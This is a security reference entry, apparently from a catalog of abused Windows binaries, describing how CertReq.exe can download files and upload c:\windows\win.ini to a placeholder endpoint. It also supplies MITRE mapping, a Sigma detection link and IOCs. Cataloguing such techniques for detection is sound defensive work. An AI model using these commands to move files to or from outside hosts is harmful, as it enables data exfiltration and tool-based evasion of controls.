---
Name: CertReq.exe
Description: Used for requesting and managing certificates
Author: 'David Middlehurst'
Created: 2020-07-07
Commands:
  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
    Description: Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory
    Usecase: Download file from Internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal
    Description: Send the file c:\windows\win.ini to the endpoint https://example.org/ via HTTP POST
    Usecase: Upload
    Category: Upload
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
Full_Path:
  - Path: C:\Windows\System32\certreq.exe
  - Path: C:\Windows\SysWOW64\certreq.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/eb8c9c046b86e7d412bdcc3235693fa1c00f70d6/rules/windows/process_creation/win_susp_certreq_download.yml
  - IOC: certreq creates new files
  - IOC: certreq makes POST requests
Resources:
  - Link: https://dtm.uk/certreq
Acknowledgement:
  - Person: David Middlehurst
    Handle: '@dtmsecurity'
---
